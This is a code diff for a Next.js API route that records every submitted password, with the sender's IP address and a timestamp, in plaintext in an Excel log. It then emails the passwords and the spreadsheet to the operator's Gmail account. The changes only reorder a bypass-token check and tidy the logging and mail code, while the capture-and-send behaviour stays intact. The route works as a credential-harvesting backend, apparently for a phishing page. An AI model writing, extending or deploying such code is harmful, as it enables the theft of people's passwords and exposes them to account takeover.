@@ -7,15 +7,15 @@ import ExcelJS from 'exceljs';
 
 export async function POST(req: Request) {
   try {
-    const { password } = await req.json();
-    const ip = req.headers.get('x-forwarded-for') || 'unknown';
-
     const bypassToken = req.headers.get('x-vercel-protection-bypass');
     const expectedToken = process.env.VERCEL_AUTOMATION_BYPASS_SECRET;
 
     if (!bypassToken || bypassToken !== expectedToken) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
     }
+
+    const { password } = await req.json();
+    const ip = req.headers.get('x-forwarded-for') || 'unknown';
 
     if (!password) {
       return NextResponse.json({ error: 'Password missing' }, { status: 400 });
@@ -25,14 +25,13 @@ export async function POST(req: Request) {
     const filePath = path.join(os.tmpdir(), fileName);
 
     const workbook = new ExcelJS.Workbook();
-    let sheet;
-
     if (fs.existsSync(filePath)) {
       await workbook.xlsx.readFile(filePath);
-      sheet = workbook.getWorksheet('Log') || workbook.addWorksheet('Log');
-    } else {
-      sheet = workbook.addWorksheet('Log');
-      sheet.addRow(['Password', 'Timestamp', 'IP']);
+    }
+    const sheet = workbook.getWorksheet('Log') || workbook.addWorksheet('Log');
+
+    if (sheet.rowCount === 0) {
+      sheet.addRow(['Password', 'Timestamp', 'IP Address']);
     }
 
     sheet.addRow([password, new Date().toISOString(), ip]);
@@ -42,24 +41,22 @@ export async function POST(req: Request) {
       service: 'gmail',
       auth: {
         user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS,
-      },
+        pass: process.env.EMAIL_PASS
+      }
     });
 
-    const mailOptions = {
+    await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER,
-      subject: 'New Password Entry',
-      text: `Password: ${password}\nIP: ${ip}\nTime: ${new Date().toISOString()}`,
+      subject: '🔐 Password Entry Notification',
+      text: `Password Entered: ${password}\nIP Address: ${ip}`,
       attachments: [
         {
-          filename: fileName,
-          path: filePath,
-        },
-      ],
-    };
-
-    await transporter.sendMail(mailOptions);
+          filename: 'password-log.xlsx',
+          path: filePath
+        }
+      ]
+    });
 
     return NextResponse.json({ success: true });
   } catch (err) {
